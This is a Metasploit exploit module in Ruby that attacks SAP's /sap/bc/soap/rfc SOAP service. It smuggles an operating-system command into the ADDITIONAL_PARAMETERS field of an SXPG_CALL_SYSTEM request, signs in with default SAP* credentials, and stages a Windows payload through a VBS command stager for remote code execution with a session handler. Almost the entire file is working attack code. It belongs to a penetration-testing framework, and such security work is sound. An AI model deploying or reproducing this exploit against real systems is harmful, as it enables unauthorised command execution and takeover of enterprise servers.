##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include Msf::Exploit::CmdStagerVBS
	include Msf::Exploit::EXE
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution',
			'Description' => %q{
								This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the
								use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured in
								the SM69 transaction.
								},
			'References' =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
				],
			'DisclosureDate' => 'March 26 2013',
			'Platform' => ['windows'],
			'Targets' => [['Windows Universal',{'Arch' => ARCH_X64,'Platform' => 'win'}]],
			'DefaultTarget' => 0,
			'Privileged' => true,
			'Author' =>['nmonkee'],
			'License' => MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [true, 'SAP Client', '001']),
				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
				OptString.new('PASSWORD', [true, 'Password', '06071992']),
				OptString.new('CMD', [true, 'SM69 command to be executed', nil]),
				OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS','Windows NT']])
			], self.class)
		register_advanced_options(
			[
				OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', 250]),
			], self.class)
	end
	
	def exploit
		linemax = datastore['PAYLOAD_SPLIT']
		print_status("Using custom payload size of #{linemax}") if linemax != 250
		print_status("[SAP] #{rhost}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
		execute_cmdstager({ :delay => 0.35, :linemax => linemax })
		handler(nil)
	end

	def execute_command(cmd, opts)
		command = cmd.gsub(/&/,'&amp;')
		os = datastore['OS']
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
		data << '<env:Body>'
		data << '<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<ADDITIONAL_PARAMETERS>&amp;' + command.to_s + '</ADDITIONAL_PARAMETERS>'
		data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
		data << '<OPERATINGSYSTEM>' + os +'</OPERATINGSYSTEM>'
		data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
		data << '</n1:SXPG_CALL_SYSTEM>'
		data << '</env:Body>'
		data << '</env:Envelope>'
		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
		begin
			res = send_request_raw({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'headers' =>{
					'Content-Length' => data.size.to_s,
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
					'Authorization' => 'Basic ' + user_pass,
					'Content-Type' => 'text/xml; charset=UTF-8'
					}
				}, 45)
			if res and res.code != 500 and res.code != 200
				# to do - implement error handlers for each status code, 404, 301, etc.
				print_error("[SAP] #{rhost}:#{rport} - something went wrong!")
				return
			elsif res and res.body =~ /faultstring/
				error = res.body.scan(%r{<faultstring>(.*?)</faultstring>})
				0.upto(error.length-1) do |i|
					print_error("[SAP] #{rhost}:#{rport} - error #{error[i]}")
				end
				return
			elsif res and res.code == 200
				return
			else
				print_error("[SAP] #{rhost}:#{rport} - Unknown error")
				return
			end
		rescue ::Rex::ConnectionError
			print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
			return
		end

	end
end
